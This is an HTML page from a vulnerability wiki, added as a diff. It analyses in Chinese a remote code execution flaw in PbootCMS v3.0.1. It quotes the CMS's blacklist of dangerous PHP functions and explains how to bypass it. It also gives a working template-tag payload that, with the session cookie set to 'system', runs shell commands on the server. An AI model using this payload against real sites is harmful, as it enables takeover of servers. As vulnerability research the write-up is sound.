@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PbootCMS/PbootCMS%20v3.0.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PbootCMS v3.0.1 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PbootCMS v3.0.1 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E9%80%9A%E6%9D%80%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E9%80%9A%E6%9D%80%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS全版本后台通杀任意代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20v2.0.9%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20v2.0.9%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.9 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="pbootcms-v301">PbootCMS v3.0.1 远程代码执行漏洞<a class="headerlink" href="#pbootcms-v301" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>PbootCMS v3.0.1</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>依然是先查看<code>apps\home\controller\ParserController.php中的parserIfLabel</code>方法的两个if标签的过滤项</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">preg_match_all</span><span class="p">(&#39;</span><span class="o">/</span><span class="p">([</span><span class="n">\w]+)([\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i&#39;,</span><span class="w"> </span><span class="n">$matches</span><span class="p">[</span><span class="mh">1</span><span class="p">][</span><span class="n">$i</span><span class="p">],</span><span class="w"> </span><span class="n">$matches2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="n">$matches2</span><span class="p">[</span><span class="mh">1</span><span class="p">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">$value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">function_exists</span><span class="p">(</span><span class="n">$value</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">in_array</span><span class="p">(</span><span class="n">$value</span><span class="p">,</span><span class="w"> </span><span class="n">$white_fun</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                            </span><span class="n">$danger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">true</span><span class="p">;</span>
+<span class="w">                            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">preg_match</span><span class="p">(&#39;</span><span class="o">/</span><span class="p">(</span><span class="n">\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)/i&#39;,</span><span class="w"> </span><span class="n">$matches</span><span class="p">[</span><span class="mh">1</span><span class="p">][</span><span class="n">$i</span><span class="p">]))</span>
+</code></pre></div>
+
+<p>关于第一处的判断，我们依然可以使用在函数名和括号之间插入控制字符的方法来绕过该处校验，对于第二处，可以看到在黑名单中相较于上个分析版本（2.0.9）添加了getallheaders的黑名单判断，于是该处我们需要寻找新的方法来实现代码执行的目的，这让我想到了array_filter函数</p>
+<p><img alt="1.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<p>通过该函数我们可以实现执行php代码，例如array_filter([\'whoami\'],\'system\');</p>
+<p>那么接下来我们需要思考如何绕过黑名单中对system的检测，在这里我们依然可以将system放到header头中，这里可以使用session_id(session_start())的方法来取到session的值，我们可以将session的值置为system，就可以成功的调用system函数来执行命令了，通过上面的思路写出利用payload使用的时候却发生了如下问题</p>
+<p><img alt="2.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p>该处的冒号被替换成了<code>@</code>符号，通过查看github更新记录可以发现如下代码段</p>
+<p><img alt="3.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>该处使用了正则来替换我们输入的if标签，为了绕过该处正则的替换我们可以使用反斜杠来进行绕过，例如{pboot:if}{/pboot:if}，该处的反斜杠会被写入数据库，而在程序调用该段数据并渲染到前台的模板时会调用到stripcslashes函数，进而删除反斜杠，代码位于core\function\handle.php中，如图</p>
+<p><img alt="4.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>通过上面的分析，我们易得如下payload</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="n">pboot</span>\<span class="p">:</span><span class="k">if</span><span class="p">(</span><span class="n">var_dump</span><span class="o">&lt;</span><span class="mh">0x01</span><span class="o">&gt;</span><span class="p">(</span><span class="n">array_filter</span><span class="o">&lt;</span><span class="mh">0x01</span><span class="o">&gt;</span><span class="p">([</span><span class="s1">&#39;whoami&#39;</span><span class="p">],</span><span class="n">session_id</span><span class="o">&lt;</span><span class="mh">0x01</span><span class="o">&gt;</span><span class="p">(</span><span class="n">session_start</span><span class="o">&lt;</span><span class="mh">0x01</span><span class="o">&gt;</span><span class="p">()))))}</span><span class="n">bbbbb</span><span class="p">{</span><span class="o">/</span><span class="n">pboot</span>\<span class="p">:</span><span class="k">if</span><span class="p">}</span>
+</code></pre></div>
+
+<p>来到后台站点信息处</p>
+<p><img alt="5.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
+<p>插入上述poc并保存，然后来到前台首页，访问前台首页抓取数据包，将cookie中session的配置项改为system,如图</p>
+<p><img alt="6.png" src="../resource/PbootCMSv3.0.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
+<p>可以看到成功执行了<code>system("whoami");</code></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/8321">https://xz.aliyun.com/t/8321</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E9%80%9A%E6%9D%80%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E9%80%9A%E6%9D%80%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS全版本后台通杀任意代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20v2.0.9%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20v2.0.9%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.9 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
